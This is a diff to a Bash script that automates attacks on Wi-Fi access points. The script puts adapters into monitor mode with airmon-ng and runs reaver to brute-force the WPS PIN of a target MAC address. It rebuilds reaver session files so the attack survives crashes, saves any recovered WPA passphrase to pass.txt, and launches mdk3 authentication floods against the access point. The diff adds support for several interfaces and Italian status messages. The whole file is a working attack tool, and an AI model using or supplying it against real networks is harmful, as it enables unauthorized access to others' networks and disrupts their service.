@@ -3,6 +3,7 @@
 declare MAC;
 declare WLAN;
 declare MON1;
+#declare RESTART=r;
 
 NEW_TERMINAL="gnome-terminal -e"
 
@@ -67,6 +68,10 @@ echo -e "\e[32m\e[1mStarting new monitor mode...\e[0m";
 MON2=`airmon-ng start wlan2 |grep -F '(monitor mode enabled on '|tr -s [:space:] ' '|cut -d ' ' -f6|tr -d ')'` 
 fi
 
+#clear
+#while [ "$RESTART" = r  ]; do
+#clear
+
 echo -e "\e[0;32m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[1;37m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[0;31m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m";
 echo -e "\e[0;32m\e[40m\e[1mx\e[36m\e[40m\e[1m           MAC ADDRESS OF AP            \e[0m\e[0;31m\e[40m\e[1mx\e[0m";
 echo -e "\e[0;32m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[1;37m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[0;31m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m";
@@ -119,11 +124,17 @@ while : ; do
 	res=$((11000 - $num))
 	fi
 	echo $res
-
+	
+	if [  "$WLAN" = 0  ]; then
+	reaver -i $MON0 -b $MAC -a -S -N -vv -L | tee log_reaver.txt & 
+	fi
+	if [  "$WLAN" = 1  ]; then
 	reaver -i $MON1 -b $MAC -a -S -N -vv -L | tee log_reaver.txt & 
+	fi
+	if [  "$WLAN" = 2  ]; then
+	reaver -i $MON2 -b $MAC -a -S -N -vv -L | tee log_reaver.txt & 
+	fi
 
-	# I choose that way to build a new wpc file when reaver crashes by not restoring previus session, 
-	# that's obviusly a better way to do it! ;)
 	sleep 3;
 	riga2=`grep "Restored" log_reaver.txt`
 	if [ "$riga2" = "" ]; then
@@ -11132,10 +11143,14 @@ echo "$res
 997
 998" > /etc/reaver/$NOME_FILE.wpc
 
-	echo "file wpc created!"
+	echo "file wpc creato!"
+
         fi
 	#sleep 5;
 	#zap3 'script_4'
+#	RESTART=r;
+	done
+		
 
 	riga=""
 	while [ "$riga" = "" ]	; do
@@ -11145,7 +11160,7 @@ echo "$res
 	riga3=`grep "WPA PSK" log_reaver.txt`
 	echo "$riga3"
 	echo "$riga3" >> pass.txt
-	echo "password copied!"
+	echo "copia password eseguita!"
 
 	zap 'reaver'
 
@@ -11153,8 +11168,17 @@ echo "$res
 	echo -e "\e[0;32m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[1;37m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[0;31m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m";
 	echo -e "\e[0;32m\e[40m\e[1mx\e[36m\e[40m\e[1m             STARTING MDK3!             \e[0m\e[0;31m\e[40m\e[1mx\e[0m";
 	echo -e "\e[0;32m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[1;37m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m\e[0;31m\e[40m\e[1mxxxxxxxxxxxxxx\e[0m";
+	
+	if [  "$WLAN" = 0  ]; then
+	mdk3 $MON0 a -a $MAC -m | tee log_mdk3.txt & 
+	fi
+	if [  "$WLAN" = 1  ]; then
+	mdk3 $MON1 a -a $MAC -m | tee log_mdk3.txt & 
+	fi
+	if [  "$WLAN" = 2  ]; then
+	mdk3 $MON2 a -a $MAC -m | tee log_mdk3.txt & 
+	fi
 
-	mdk3 $MON1 a -a $MAC -m | tee log_mdk3.txt &
 	riga=""
 	while [ "$riga" = "" ]	; do
 		riga=`cat log_mdk3.txt | grep "Device"`
